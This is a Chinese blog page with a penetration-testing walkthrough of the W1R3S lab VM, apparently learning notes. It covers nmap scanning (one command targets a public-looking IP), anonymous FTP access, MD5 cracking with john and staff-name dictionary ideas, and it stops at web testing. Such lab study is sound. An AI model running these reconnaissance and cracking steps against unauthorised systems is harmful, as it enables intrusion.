@@ -1,0 +1,2228 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>我的技术与生活——靶机精炼-思路为王（一） | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="shortcut icon" href="/imgs/shortcut-icon.ico" type="image/x-icon">
+  <link rel="stylesheet" href="/css/public.css" />
+  <link rel="stylesheet" href="/css/layout.css" />
+  <link rel="stylesheet" href="/css/iconfont.css" />
+  <link rel="stylesheet" href="/css/APlayer.min.css" />
+  <script src="/js/APlayer.min.js"></script>
+  <script src="/js/jquery.min.js"></script>
+  <script src="/js/jquery.pjax.min.js"></script>
+
+  <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+  <script>
+    document.title = `我的技术与生活——靶机精炼-思路为王（一）`
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<style>
+  .load {
+    width: 100%;
+    height: 100vh;
+    background-color: rgb(37, 35, 40);
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    position: relative;
+    z-index: 9999;
+  }
+  .load-circle {
+    width: 80px;
+    height: 80px;
+    border: 8px solid orange;
+    border-bottom-color: transparent;
+    border-radius: 50%;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    animation: rotate 1s linear infinite;
+    filter: drop-shadow(0 0 3px orange);
+  }
+  .load-circle-inner {
+    width: 40px;
+    height: 40px;
+    border: 8px solid orange;
+    border-top-color: transparent;
+    border-radius: 50%;
+    animation: rotate-reverse .5s linear infinite;
+  }
+  .load-text {
+    margin-top: 20px;
+    font-size: 24px;
+    color: orange;
+    display: flex;
+  }
+  .load-text span {
+    margin: 0 5px;
+    text-shadow: 5px 5px 5px orange;
+    animation: move 1s linear infinite;
+  }
+  .load-text span:nth-child(1) {
+    animation-delay: -0.6s;
+  }
+  .load-text span:nth-child(2) {
+    animation-delay: -0.5s;
+  }
+  .load-text span:nth-child(3) {
+    animation-delay: -0.4s;
+  }
+  .load-text span:nth-child(4) {
+    animation-delay: -0.3s;
+  }
+  .load-text span:nth-child(5) {
+    animation-delay: -0.2s;
+  }
+  .load-text span:nth-child(6) {
+    animation-delay: -0.1s;
+  }
+  @keyframes rotate {
+    0% { transform: rotate(0); }
+    100% { transform: rotate(360deg); }
+  }
+  @keyframes rotate-reverse {
+    0% { transform: rotate(0); }
+    100% { transform: rotate(-360deg); }
+  }
+  @keyframes move {
+    0% { transform: translateY(0%) rotate(0) scale(1); }
+    20% { transform: translateY(20%) rotate(10deg) scale(1.2); }
+    80% { transform: translateY(-10%) rotate(-20deg) scale(.8);}
+    100% { transform: translateY(0) rotate(0) scale(1); }
+  }
+
+  .progress {
+    position: fixed;
+    left: 0; top: 0;
+    width: 0;
+    height: 3px;
+    background-color: green;
+    transition: all cubic-bezier(0.215, 0.610, 0.355, 1) .1s;
+    z-index: 9999;
+  }
+
+  .to-up {
+    animation: toUp .5s 1;
+  }
+  .gray {
+    position: fixed;
+    left: 0;
+    top: 0;
+    width: 100%;
+    height: 100vh;
+    z-index: 9999;
+    display: none;
+    pointer-events: none;
+    background-color: #000;
+    mix-blend-mode: color;
+  }
+  @keyframes toUp {
+    from { transform: translateY(15px); opacity: 0; }
+    to { transform: translateY(0) ; opacity: 1; }
+  }
+</style>
+<body>
+  <div id="load" class="load">
+    <div class="load-circle">
+      <div class="load-circle-inner"></div>
+    </div>
+    <p class="load-text">
+      <span>L</span>
+      <span>O</span>
+      <span>A</span>
+      <span>D</span>
+      <span>I</span>
+      <span>N</span>
+      <span>G</span>
+    </p>
+  </div>
+  <div id="container" class="container w-100 vh-100" style="display: none;">
+    <header class="header">
+  <div class="header-wrapper">
+    <div class="header-left">
+      <div class="header-search">
+        <input id="search-input" type="text" class="header-search--input" placeholder="请输入要检索的文章标题" />
+        <span id="search-btn" class="header-search--icon"><i class="iconfont icon-sousuo"></i></span>
+      </div>
+      <div id="search-layer" class="header-search--layer hidden">
+        <p class="title">
+          <span>以下是搜索内容：</span>
+          <span id="close-layer-btn">关闭</span>
+        </p>
+        <ul>
+        </ul>
+      </div>
+    </div>
+    <div class="header-right">
+      <ul class="header-menu">
+        <li>
+          <a href="https://lmlsama.top/">
+            <i class="header-menu--icon iconfont icon-shouye"></i>
+            <span class="header-menu--span">首页</span>
+          </a>
+        </li>
+        <li>
+          <a href="https://lmlsama.top/log">
+            <i class="header-menu--icon iconfont icon-rizhi"></i>
+            <span class="header-menu--span">日志</span>
+          </a>
+        </li>
+        <li>
+          <a href="https://lmlsama.top/link">
+            <i class="header-menu--icon iconfont icon-youqinglianjie"></i>
+            <span class="header-menu--span">友情链接</span>
+          </a>
+        </li>
+        <li>
+          <a href="https://lmlsama.top/about">
+            <i class="header-menu--icon iconfont icon-guanyuwomen"></i>
+            <span class="header-menu--span">关于我</span>
+          </a>
+        </li>
+      </ul>
+    </div>
+  </div>
+</header>
+
+<script>
+  const ipt = document.querySelector('#search-input')
+  const btn = document.querySelector('#search-btn')
+  const layer = document.querySelector('#search-layer')
+  const posts = JSON.parse(`[{"title":"W","cover":"/images/default-cover.webp","path":"2026/03/13/W/"},{"title":"W1R3S 1.0.1 靶机","cover":"/images/default-cover.webp","path":"2026/03/13/W1R3S 1.0.1 靶机/"},{"title":"域渗透","cover":"/images/default-cover.webp","path":"2026/03/13/域渗透/"},{"title":"票据攻击","cover":"/images/default-cover.webp","path":"2026/03/19/票据攻击/"},{"title":"靶机精炼-思路为王（四）","cover":"/images/default-cover.webp","path":"2026/03/20/靶机精炼-思路为王（四）/"},{"title":"靶机精炼-思路为王（三）","cover":"/images/default-cover.webp","path":"2026/03/20/靶机精炼-思路为王（三）/"},{"title":"靶机精炼-思路为王（一）","cover":"/images/default-cover.webp","path":"2026/03/20/靶机精炼-思路为王（一）/"},{"title":"靶机精炼-思路为王（二）","cover":"/images/default-cover.webp","path":"2026/03/20/靶机精炼-思路为王（二）/"}]`)
+  ipt.addEventListener('keyup', e => {
+    if (e.key === 'Enter') {
+      handleSearch()
+    }
+  })
+  btn.addEventListener('click', () => {
+    handleSearch()
+  })
+
+  document.querySelector('#close-layer-btn').addEventListener('click', () => {
+    layer.classList.toggle('hidden')
+  })
+
+  function handleSearch() {
+    if (ipt.value.trim() === '') {
+      return
+    }
+    let html = ''
+    const targetPosts = posts.filter(post => post.title.includes(ipt.value))
+    targetPosts.forEach(post => {
+      html += `
+        <li>
+          <div>
+            <a href="/${post.path}">${post.title.replace(new RegExp(ipt.value), `<span>${ipt.value}</span>`)}</a>
+          </div>
+          <img src="${post.cover || '/imgs/default-cover.webp' }" />
+        </li>
+      `
+    })
+    if (html.trim () === '') {
+      html += '<p class="empty">没有搜索到内容</p>'
+    }
+    layer.querySelector('ul').innerHTML = html
+    layer.classList.remove('hidden')
+  }
+</script> 
+    <section id="main" class="main">
+      <div class="main-left-wrapper">
+<div class="main-left">
+  <div class="main-left--block">
+    <div class="main-left--info">
+      <img src="/imgs/avatar.jpg"" class="main-left--avatar" />
+      <div class="main-left--intro">
+        <p class="main-left--name">lmlsama</p>
+        <div class="main-left--tags">
+          <span class="main-left--tag">kong</span>
+          <span class="main-left--tag">kong</span>
+        </div>
+      </div>
+    </div>
+  
+    <div>
+      <div class="main-left--motto">
+        <p>“井底之蛙，虽不曾见过大海”</p>
+        <p>“但知晓天之湛蓝”</p>
+      </div>
+      <div class="main-left--github">
+        <span class="line"></span>
+        <a target="_blank" rel="noopener" href="https://github.com/LMLsama/LMLsama.github.io"><i class="logo iconfont icon-github-fill"></i></a>
+        <span class="line"></span>
+      </div>
+      <div class="main-left--statics">
+        <a href="/categories">
+          <div>
+            <span>2</span>
+            <span>分类</span>
+          </div>
+        </a>
+        <a href="/tags">
+          <div>
+            <span>2</span>
+            <span>标签</span>
+          </div>
+        </a>
+        <a href="/archives">
+          <div>
+            <span>1 </span>
+            <span>归档</span>
+          </div>
+        </a>
+      </div>
+    </div>
+  </div>
+
+  <div class="main-left--block">
+    <ul class="main-left--menu">
+      
+        <li>
+          <a href="/">
+            <span class="header-menu--span">小站首页</span>
+            <i class="header-menu--icon iconfont icon-shouye"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/log">
+            <span class="header-menu--span">个人日志</span>
+            <i class="header-menu--icon iconfont icon-rizhi"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/link">
+            <span class="header-menu--span">友情链接</span>
+            <i class="header-menu--icon iconfont icon-youqinglianjie"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/about">
+            <span class="header-menu--span">关于自己</span>
+            <i class="header-menu--icon iconfont icon-guanyuwomen"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/tools">
+            <span class="header-menu--span">我的工具</span>
+            <i class="header-menu--icon iconfont icon-gongju"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+
+  <div class="main-left--block">
+    <div class="main-left--site">
+      <h5 class="main-left--title">
+        <span>站点信息</span>
+        <i class="iconfont icon-zhandian"></i>
+      </h5>
+      <p class="main-left--subtitle">
+        <span>文章数目：</span>
+        <span>8 篇</span>
+      </p>
+      <p class="main-left--subtitle">
+        <span>最近动态：</span>
+        <span>今天</span>
+      </p>
+      <p class="main-left--subtitle">
+        <span>上线时间：</span>
+        <span>1494天</span>
+      </p>
+      <p class="main-left--subtitle">
+        <span>当前版本：</span>
+        <span>v1.0.2</span>
+      </p>
+    </div>
+  </div>
+</div></div>
+      <div id="main-container" class="main-container">
+
+
+  <link rel="stylesheet" href="/css/partial/article.css" />
+
+<div class="article-container">
+  <div class="article">
+    <h1 class="article-title">靶机精炼-思路为王（一）</h1>
+    <div class="article-info">
+      <div class="article-info--item">
+        <div class="article-info--info">
+          
+          <div class="article-info--categories">
+            <span>分类：</span>
+            
+          </div>
+          
+          
+          <div class="article-info--tags">
+            <span>标签：</span>
+            
+          </div>
+          
+          <p class="article-info--date">日期：2026-03-20 13:58:52</p>
+        </div>
+        <img src="/images/default-cover.webp" alt="" class="article-cover">
+      </div>
+    </div>
+    <article class="article-content markdown-body">
+      <p>素材来自B站<strong>红队笔记</strong> <code>[红队笔记的个人空间-红队笔记个人主页-哔哩哔哩视频](https://space.bilibili.com/491748397?spm_id_from=333.337.0.0)</code></p>
+<h1 id="W1R3S-1-0-1"><a href="#W1R3S-1-0-1" class="headerlink" title="W1R3S 1.0.1"></a>W1R3S 1.0.1</h1><h2 id="一，nmap-扫描与分析（精）-可以扫两次看看是否一致"><a href="#一，nmap-扫描与分析（精）-可以扫两次看看是否一致" class="headerlink" title="一，nmap 扫描与分析（精）&lt; 可以扫两次看看是否一致 &gt;"></a>一，nmap 扫描与分析（精）&lt; 可以扫两次看看是否一致 &gt;</h2><h3 id="1-主机探测和端口扫描（发现哪些端口是开放的）"><a href="#1-主机探测和端口扫描（发现哪些端口是开放的）" class="headerlink" title="1.主机探测和端口扫描（发现哪些端口是开放的）"></a>1.主机探测和端口扫描（发现哪些端口是开放的）</h3><p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320134437198.png" alt="image-20251020210239212"></p>
+<blockquote>
+<h2 id="Nmap-命令中-sn-的作用"><a href="#Nmap-命令中-sn-的作用" class="headerlink" title="Nmap 命令中-sn 的作用"></a><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Nedved/p/10472420.html">Nmap 命令中-sn 的作用</a></h2><p><strong>在 Nmap 命令中，</strong><em>-sn</em> 选项的主要作用是<strong>探测主机是否存活</strong>，而不进行端口扫描。它的设计初衷是快速发现目标网络中的活动主机，同时避免深入扫描端口以减少对目标的影响。</p>
+<p><strong>功能与特点</strong></p>
+<p><em>-sn</em> 的全称是 <strong>Ping 扫描</strong>，其核心功能是通过发送探测数据包来判断目标主机是否在线，而不会进一步探测端口状态。与传统的 ICMP Ping 相比，<em>-sn</em> 更加灵活，支持多种协议和探测方式。</p>
+<p><strong>工作机制</strong></p>
+<p><em>-sn</em> 的具体实现方式取决于用户权限和网络环境：</p>
+<ul>
+<li><strong>特权用户</strong>：发送 ICMP 回显请求、TCP SYN 包（默认端口 443）、TCP ACK 包（默认端口 80）以及 ICMP 时间戳请求，综合提高探测成功率。</li>
+<li><strong>非特权用户</strong>：通过标准的 TCP 连接调用（如 connect()）发送探测包，通常仅限于常见端口（如 80 和 443）。</li>
+<li><strong>本地网络</strong>：在同一子网中，<em>-sn</em> 会优先使用 ARP 请求进行探测，这种方式效率更高且更可靠。</li>
+</ul>
+<p><strong>使用场景</strong></p>
+<p><em>-sn</em> 适用于以下场景：</p>
+<ul>
+<li><strong>网络运维</strong>：快速检查网络中哪些主机在线，便于监控和管理。</li>
+<li><strong>安全测试</strong>：在不触发防火墙或入侵检测系统的情况下，获取目标网络的在线主机列表。</li>
+</ul>
+<p><strong>示例</strong></p>
+<p><strong>以下是一个使用</strong><em>-sn</em> 的简单示例：</p>
+<p><strong>nmap -sn 192.168.1.0&#x2F;24</strong></p>
+<p><strong>此命令会扫描 192.168.1.0&#x2F;24 网段中的所有主机，并返回存活主机的列表，而不会进行端口扫描。</strong></p>
+<p><strong>注意事项</strong></p>
+<p><em>-sn</em> 选项可以与其他参数组合使用（如*-Pn*），以适应更复杂的网络环境。如果目标网络存在严格的防火墙规则，可以通过调整探测方式（如*-PE* 或*-PS*）来提高探测效果。</p>
+</blockquote>
+<p><strong>ping 扫描，允许轻量级的入侵而不被注意，知道有多少主机可用状态</strong></p>
+<p><strong>为什么用 sudo 接命令，而不是直接用红色的 root 权限来做事：避免误用了恶意命令使得重要配置文件被修改</strong></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/2302_80189643/article/details/139297137">https://blog.csdn.net/2302_80189643&#x2F;article&#x2F;details&#x2F;139297137</a>     <strong>nmap 过墙</strong>博客</p>
+<p><strong>以最小速率不低于 10000（–min-rate） 扫面该靶机的所有端口（-p-）后面的-代表所有</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap --min-rate 10000 -p- 124.222.110.176</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320134455301.png" alt="image-20251020211504532"></p>
+<p><strong>-sS  SYN 包只完成第一步三次握手，快速探测</strong></p>
+<p><strong>-sT  三次握手完整，完整 tcp 连接，准确。适用于 syn 过滤机制，防火墙(准确 + 稳定性)</strong></p>
+<p><strong>–min-rate 10000 是隐蔽性和速度的权衡</strong></p>
+<p><strong>-p-全部扫描</strong></p>
+<p><strong>-o 输出 A 所有（扫描结果的数据化）</strong></p>
+<p><strong>把输出结果存入 xx 文件夹的 xx 文件，格式所有都要</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320134845719.png" alt="image-20251020211811337"></p>
+<table>
+<thead>
+<tr>
+<th><strong>参数</strong></th>
+<th><strong>含义</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-l</code></td>
+<td><strong>长格式（权限、链接数、属主、属组、大小、时间、名称）</strong></td>
+</tr>
+<tr>
+<td><code>-i</code></td>
+<td><strong>显示每个文件的****inode 号</strong>（文件系统唯一标识）</td>
+</tr>
+<tr>
+<td><code>-a</code></td>
+<td><strong>显示****所有</strong>文件，包括以 <code>.</code> 开头的隐藏文件</td>
+</tr>
+<tr>
+<td><code>-h</code></td>
+<td><strong>文件大小用****人类可读</strong>单位（K、M、G）</td>
+</tr>
+</tbody></table>
+<p><strong>三种格式</strong></p>
+<p><strong>.gnmap 旧默认版本（已弃用）</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131838.png" alt="image-20251020212001723"></p>
+<p><strong>.namp 屏幕显示结果</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131839.png" alt="image-20251020212041844"></p>
+<p><strong>.xml 能给我们更多信息，作者更推荐</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320134845730.png" alt="image-20251020212213016"></p>
+<hr>
+<p><strong>提取扫描结果，把端口号用逗号分隔的一行数据</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131840.png" alt="image-20251020212747647"></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320134847911.png" alt="image-20251020212844897"></p>
+<h3 id="2-详细信息扫描（重中之重）"><a href="#2-详细信息扫描（重中之重）" class="headerlink" title="2.详细信息扫描（重中之重）"></a>2.详细信息扫描（重中之重）</h3><p><strong>详细信息扫描的结果重中之重</strong></p>
+<p><strong>每一项扫出什么信息，根据信息确定攻击面，和渗透的优先级</strong></p>
+<p><strong>如 21 ftp 可能存在信息泄露（优先 1）</strong></p>
+<p><strong>列出 ssh 主机密钥</strong></p>
+<p><strong>很可能是 ubuntu 系统</strong></p>
+<p><strong>80 端口的 apache 的 title 也列了出来（最后重点 3）</strong></p>
+<p><strong>3306 mysql？有疑问（再 2）</strong></p>
+<p><strong>通过 MAC 地址确定靶机在 VMware 中</strong></p>
+<p><strong>操作系统 97% 可能是 Linux，具体内核版本还要进一步判断</strong></p>
+<p><strong>一般一个攻击向量花一个小时，如果拿不到进一步结果需要更换</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320134848036.png" alt="image-20251020213308506"></p>
+<p><strong>-sT  TCP 扫描</strong></p>
+<p><strong>-sV 详细版本信息</strong></p>
+<p><strong>-sC 脚本</strong></p>
+<p><strong>-O 靶机的操作系统</strong></p>
+<h3 id="3-UDP-扫描"><a href="#3-UDP-扫描" class="headerlink" title="3.UDP 扫描"></a>3.UDP 扫描</h3><p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320134848510.png" alt="image-20251020213143976"></p>
+<p>**–top-ports 20 先用常用的 20 个 udp 端口扫描 **</p>
+<h3 id="4-漏洞脚本的扫描"><a href="#4-漏洞脚本的扫描" class="headerlink" title="4.漏洞脚本的扫描"></a>4.漏洞脚本的扫描</h3><p><strong>，没有什么有价值的信息，但要尝试</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131841.png" alt="image-20251020214219767"></p>
+<p><strong>最后别忘了 IPv6 的探测</strong></p>
+<h3 id="5-IPv6-扫描"><a href="#5-IPv6-扫描" class="headerlink" title="5.IPv6 扫描"></a>5.IPv6 扫描</h3><h5 id="IOXIDResolver-工具：发现该-IPv4-的网卡有没有-IPv6-开放"><a href="#IOXIDResolver-工具：发现该-IPv4-的网卡有没有-IPv6-开放" class="headerlink" title="IOXIDResolver 工具：发现该 IPv4 的网卡有没有 IPv6 开放"></a>IOXIDResolver 工具：发现该 IPv4 的网卡有没有 IPv6 开放</h5><p><strong>可以 v4 扫 v6</strong></p>
+<p><strong>也可以 v6 扫 v4</strong></p>
+<p><strong>本质上是爆出全部的 IPv4 和 IPv6 信息</strong></p>
+<p><strong>域渗透靶机 APT 开局</strong>有相关信息</p>
+<p><strong>下载脚本</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131842.png" alt="image-20251020195401207"></p>
+<p><strong>给它权限****读 (r)</strong>、<strong>写 (w)</strong> 和 <strong>执行 (x)</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320134850874.png" alt="image-20251020195447551"></p>
+<p><strong>查看帮助，他只有一种命令-t</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131843.png" alt="image-20251020195620165"></p>
+<p><strong>发现 IPv6 地址</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320134852710.png" alt="image-20251020195913161"></p>
+<h5 id="nmap：扫描-IPv6-的端口"><a href="#nmap：扫描-IPv6-的端口" class="headerlink" title="nmap：扫描 IPv6 的端口"></a>nmap：扫描 IPv6 的端口</h5><p><strong>增加了很多攻击向量</strong></p>
+<h5 id="snmpwalk-工具（简单网络管理协议-枚举）"><a href="#snmpwalk-工具（简单网络管理协议-枚举）" class="headerlink" title="snmpwalk 工具（简单网络管理协议 枚举）"></a>snmpwalk 工具（简单网络管理协议 枚举）</h5><p>** 自己加个筛选器就可以筛选出 IPv6 了**</p>
+<h4 id="Windows-下的工具"><a href="#Windows-下的工具" class="headerlink" title="Windows 下的工具"></a>Windows 下的工具</h4><p><strong>chisel sshuttle    隧道工具</strong></p>
+<h3 id="攻击面分析，确定初步的渗透优先级和策略"><a href="#攻击面分析，确定初步的渗透优先级和策略" class="headerlink" title="攻击面分析，确定初步的渗透优先级和策略"></a>攻击面分析，确定初步的渗透优先级和策略</h3><p><strong>这里是根据 2.详细信息扫描（重中之重）确定的，可跳转查看</strong></p>
+<p><strong>21 ftp 可能存在信息泄露（优先 1）</strong></p>
+<p><strong>列出 ssh 主机密钥</strong></p>
+<p><strong>很可能是 ubuntu 系统</strong></p>
+<p><strong>80 端口的 apache 的 title 也列了出来（最后重点 3）</strong></p>
+<p><strong>3306 mysql？有疑问（再 2）</strong></p>
+<p><strong>通过 MAC 地址确定靶机在 VMware 中</strong></p>
+<p><strong>操作系统 97% 可能是 Linux，具体内核版本还要进一步判断</strong></p>
+<p><strong>一般一个攻击向量花一个小时，如果拿不到进一步结果需要更换</strong></p>
+<h2 id="二，FTP-渗透（精）"><a href="#二，FTP-渗透（精）" class="headerlink" title="二，FTP 渗透（精）"></a>二，FTP 渗透（精）</h2><h3 id="1-ftp-连接靶机"><a href="#1-ftp-连接靶机" class="headerlink" title="1.ftp 连接靶机"></a>1.ftp 连接靶机</h3><p><strong>因为我们 nmap 发现靶机存在 ftp 匿名登陆，那么我们就 ftp 连接靶机</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320134854828.png" alt="image-20251022165334872"></p>
+<p><strong>然后会询问你登录名称（ftp 匿名登陆的用户名都是 anoymous）输入</strong></p>
+<p><strong>然后密码直接为空，什么都不用填，回车</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320134855419.png" alt="image-20251022165526724"></p>
+<p><strong>binary mode 提示用二进制模式传输文件</strong></p>
+<p><strong>先输入 binary 切换到二进制模式（好习惯，否则下载下来的文件可能会损坏）</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320134855694.png" alt="image-20251022165809594"></p>
+<p><strong>ftp 命令行跟 Linux 很像，? 查看可执行命令</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320134855710.png" alt="image-20251022165848217"></p>
+<h3 id="2-发现目录下的文件并全部下载"><a href="#2-发现目录下的文件并全部下载" class="headerlink" title="2.发现目录下的文件并全部下载"></a>2.发现目录下的文件并全部下载</h3><p><strong>看到包含的几个目录，转到 content 目录下，发现有三个文件，尝试下载</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320134856283.png" alt="image-20251022170035942"></p>
+<p><strong>先关闭交互模式命令 prompt （否则多个文件都要求你确认）</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131844.png" alt="image-20251022170151116"></p>
+<p><strong>下载所有的.txt 文件 mget *.txt</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320134857374.png" alt="image-20251022170228712"></p>
+<p><strong>然后返回上级目录 cd ..   然后看第二个目录 docs</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131845.png" alt="image-20251022170543475"></p>
+<p><strong>发现只有一个文件</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131846.png" alt="image-20251022170634951"></p>
+<p><strong>下载 get</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131847.png" alt="image-20251022170719188"></p>
+<p><strong>最后下载最后一个目录下的文件</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320134858645.png" alt="image-20251022170813497"></p>
+<p><strong>全都下载完成后就可以退出了</strong></p>
+<h3 id="3-查看各个文件的内容进行逐个分析"><a href="#3-查看各个文件的内容进行逐个分析" class="headerlink" title="3.查看各个文件的内容进行逐个分析"></a>3.查看各个文件的内容进行逐个分析</h3><p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320134859255.png" alt="image-20251022171001781"></p>
+<p><strong>W1R3S 即 WIRES —–leetspeak（解决的是申请名重复的问题，可以查一下减少渗透过程的陌生感）</strong></p>
+<p><strong>new 新建立的 ftp 服务器的 有线 配置文件 —刚建的可能会有什么问题（思考</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131848.png" alt="image-20251022171444950"></p>
+<p><strong>如何判断是什么类型的字符串：</strong></p>
+<p><strong>1.感觉-加密</strong></p>
+<p><strong>2.hash-identifier  会告诉你可能的加密算法</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320134859775.png" alt="image-20251022171700515"></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131849.png" alt="image-20251022171717301"></p>
+<p><strong>3.直接放网页上搜，看提示</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131850.png" alt="image-20251022171609014"></p>
+<p><strong>如何解密：</strong> <strong>先用 vim 写入到 hash 文件中</strong></p>
+<p><strong>然后丢给 john</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131851.png" alt="image-20251022172011002"></p>
+<p><strong>或者找个网站 md5 cracker 一个不行换另一个</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131852.png" alt="image-20251022172131277"></p>
+<p><strong>可以发现后面跟了一串英文就是明文</strong></p>
+<p><strong>然后用 md5 校验一下明文，发现原密文和校验后的结果一致，即可确定：md5 |  this..</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131853.png" alt="image-20251022172303087"></p>
+<p><strong>然后看下一串字母</strong></p>
+<p><strong>经验得知是 base64 然后试一下,可以用 kali 自带的工具  -d 表示要求解码</strong></p>
+<blockquote>
+<p><strong>base64 特点</strong>除了数字和大小写字母，剩下的特殊符号只有 3 个。 第一是看特殊字符，或者说是正则规则匹配 + &#x2F; &#x3D; 0-9 a-z A-Z 确认没有其他特殊字符就可以尝试 base64 的解码 第二就是 &#x3D; 只在文末出现，最多 2 个。原因是补足 第三就是一些特殊情况。稍微复杂一点，主要是针对短字符串，首先 base64 的字符串一定能被 4 整数。比如 root 可以被 4 整除，但它其实并不是 base64 编码，因为解码之后的 ascii 码不在 32-126 之间，会有乱码。所以这里的主要判断方法还是解码看有没有乱码。这里还有一个特例，就是长度为 1 的非 base64 的字符串解码是空。 补充一下:文件包含那里我个人偏向直接使用编码绕过，比如 base64，但是需要注意的是，base64 编码里面可能出现&#x2F;，这个是 url 里面的作用师傅们都知道，所以需要使用 url 编码，如果很不幸的 waf 做了防护，给你反解回去了，那么挺倒霉的，我的建议是换个方向，基本双重编码也没什么用。</p>
+<p><strong>base64 主要功能是把 3 字节的二进制数据编码成 4 字节的文本数据，这样编码的好处是可以直接在邮件或者网页里面展示。上文说的补足就是补位的意思，把长度不足 3 位倍数的数据填补到 3n 的长度，解码的时候会自动去掉。 然后刚才说漏了一点，+ 在 url 里面也是特殊的。 给出我自己常用的编码解码 base64 字符串的方式 base64.b64encode(“aaa”) base64.b64decode(“aaaa”)</strong></p>
+</blockquote>
+<p><strong>下一个，分隔符下面是一串用****ascii 码</strong>写的 banner</p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131854.png" alt="image-20251022173357076"></p>
+<p><strong>看到下面有该公司的工作人员（角色的信息&#x2F;功能）   （思路！）</strong></p>
+<p><strong>manager：可能有基于业务的高权限，所有人员的数据…</strong></p>
+<p><strong>IT Dept：基于技术的高权限，系统权限…</strong></p>
+<p><strong>Human Resources：相关人员的最详细信息…</strong></p>
+<p><strong>可能可以根据这些人员进行字典爆破，</strong></p>
+<p><strong>如果拿到了 xx 人员的权限，他可能是干什么的，能拿到哪些信息…</strong></p>
+<p><strong>最后看最下面的两串乱的英文</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131855.png" alt="image-20251022180053362"></p>
+<p><strong>flip 上下翻转       reverse 前后逆序         upside-down    text   上到下的文本反转</strong></p>
+<p><strong>搜索以后可以看看网上是这么描述件事情的，然后找网页去试试     （也可以直接把电脑屏幕倒过来看）</strong></p>
+<p><strong>上下翻转加逆序得到</strong></p>
+<p><strong>至此 ftp 端口测试全部结束，没有什么有用信息。</strong></p>
+<p><strong>转换战场</strong></p>
+<h2 id="三，看一下-3306-MySQL"><a href="#三，看一下-3306-MySQL" class="headerlink" title="三，看一下 3306 MySQL"></a>三，看一下 3306 MySQL</h2><p><strong>思路是一定要试，但是不要报太大希望</strong></p>
+<p><strong>-u 跟用户名（因为一定有 root 账户）</strong></p>
+<p><strong>-p 不知道（可为空先试一下）</strong></p>
+<p><strong>自己的主机不允许连接，暂时放弃</strong></p>
+<h2 id="四，web-渗透（精）"><a href="#四，web-渗透（精）" class="headerlink" title="四，web 渗透（精）"></a>四，web 渗透（精）</h2><h3 id="1-先看-80-端口"><a href="#1-先看-80-端口" class="headerlink" title="1.先看 80 端口"></a>1.先看 80 端口</h3><p><strong>打开浏览器，看看这个 IP 跑的什么服务</strong></p>
+<p><strong>可以看看有没有什么小的信息（小网站，新建的网站）</strong></p>
